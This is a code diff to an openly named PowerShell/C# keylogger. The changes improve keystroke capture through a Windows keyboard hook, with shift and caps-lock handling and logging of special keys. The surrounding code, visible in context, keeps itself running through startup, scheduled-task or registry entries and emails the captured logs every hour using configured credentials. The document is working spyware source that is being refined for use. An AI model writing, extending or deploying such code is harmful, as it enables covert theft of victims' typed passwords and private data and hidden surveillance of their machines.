@@ -6,7 +6,7 @@ Param (
 )
 
 $Email = "email@email.com"
-$Password = "MyPasswords"
+$Password = "MyPassword"
 
 
 $validPersistanceTypes = "Startup", "TaskScheduler", "Registry", "All"
@@ -77,6 +77,16 @@ namespace KeyLogger {
 	private const int VK_RETURN = 0x0D;  // Enter key
 	private const int VK_SPACE = 0x20;   // Spacebar
 	private const int VK_OEM_PERIOD = 0xBE;   // For any country/region, the "." key
+	private const int VK_LSHIFT = 0xA0;   
+	private const int VK_RSHIFT = 0xA1;   
+	private const int VK_CAPITAL = 0x14;   
+	private const int VK_BACK = 0x08;
+	private const int VK_TAB = 0x09;
+	private const int VK_LEFT = 0x25;
+	private const int VK_UP = 0x26;
+	private const int VK_RIGHT = 0x27;
+	private const int VK_DOWN = 0x28;
+	private const int VK_DELETE = 0x2E;
 
     private static StreamWriter logFile;
 
@@ -108,14 +118,56 @@ namespace KeyLogger {
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
       if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
         int vkCode = Marshal.ReadInt32(lParam);
-		if (vkCode == VK_RETURN) {
+
+		bool shiftPressed = (GetAsyncKeyState(VK_LSHIFT) & 0x8000) != 0 || (GetAsyncKeyState(VK_RSHIFT) & 0x8000) != 0;
+        bool capsLockActive = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+
+		char keyChar = (char)MapVirtualKey((uint)vkCode, 2);
+
+		if (char.IsLetter(keyChar)) {
+			if (shiftPressed ^ capsLockActive) {
+				Console.WriteLine("Need to Upper");
+				keyChar = char.ToUpper(keyChar);
+			} else {
+				Console.WriteLine("Need to Lower");
+				keyChar = char.ToLower(keyChar);
+				}
+			logFile.Write(keyChar);
+		} else if (char.IsDigit(keyChar) || char.IsPunctuation(keyChar)) {
+			
+			if (shiftPressed) {
+				keyChar = (char)MapVirtualKey((uint)vkCode, 2);
+				Console.WriteLine("Need to shift the keyboard to " + keyChar);
+			}
+			Console.WriteLine("Shift not pressed though" + keyChar);
+			logFile.Write(keyChar);
+
+		} else if (vkCode == VK_RETURN) {
 			logFile.WriteLine();
 		} else if (vkCode == VK_SPACE) {
 			logFile.Write(" ");
+		} else if (vkCode == VK_TAB) {
+		 	logFile.Write("\t");
+		} else if (vkCode == VK_BACK) {
+		 	logFile.Write("<BACKSPACE>");
+		} else if (vkCode == VK_DELETE) {
+		 	logFile.Write("<DELETE>");
+		} else if (vkCode == VK_LEFT) {
+		 	logFile.Write("<LEFT>");
+		} else if (vkCode == VK_RIGHT) {
+		 	logFile.Write("<RIGHT>");
+		} else if (vkCode == VK_UP) {
+		 	logFile.Write("<UP>");
+		} else if (vkCode == VK_DOWN) {
+		 	logFile.Write("<DOWN>");
 		} else if (vkCode == VK_OEM_PERIOD) {
 		    logFile.Write(".");
 		} else {
-        	logFile.Write((Keys)vkCode);
+			if (char.IsWhiteSpace(keyChar)) {
+        		logFile.Write(keyChar);
+			} else { 
+			 logFile.Write((Keys)vkCode);
+			}
 		}
       }
 
@@ -130,6 +182,15 @@ namespace KeyLogger {
 
     [DllImport("user32.dll")]
     private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+	[DllImport("user32.dll")]
+	private static extern int MapVirtualKey(uint uCode, uint uMapType);
+
+    [DllImport("user32.dll")]
+    private static extern short GetAsyncKeyState(int vKey);
+
+    [DllImport("user32.dll")]
+    private static extern short GetKeyState(int vKey);
 
     [DllImport("kernel32.dll")]
     private static extern IntPtr GetModuleHandle(string lpModuleName);
@@ -200,7 +261,6 @@ function ScheduleMail($MinutesInterval=60) {
         $SecondsInterval = $MinutesInterval * 60
         $nextInterval = $now.AddMinutes($MinutesInterval - ($now.Minute % $MinutesInterval))
 		$timeLeft = ($nextInterval - $now).TotalSeconds
-	
         Start-Sleep -Seconds $timeLeft
         while ($true) {
             sendMail
@@ -242,6 +302,7 @@ function CreatePersistance($Type) {
 			
 		"Startup" {
 			# Place your specific logic for Startup here
+			Write-Output "[DEBUG][Persistance] Persisting startup."
 			persistStartup
 		}
 		"TaskScheduler" {
@@ -264,8 +325,7 @@ function CreatePersistance($Type) {
 	
 }
 
-
 sendMail
-KeyLog
 CreatePersistance -Type $Type
+KeyLog
 ScheduleMail -MinutesInterval 60
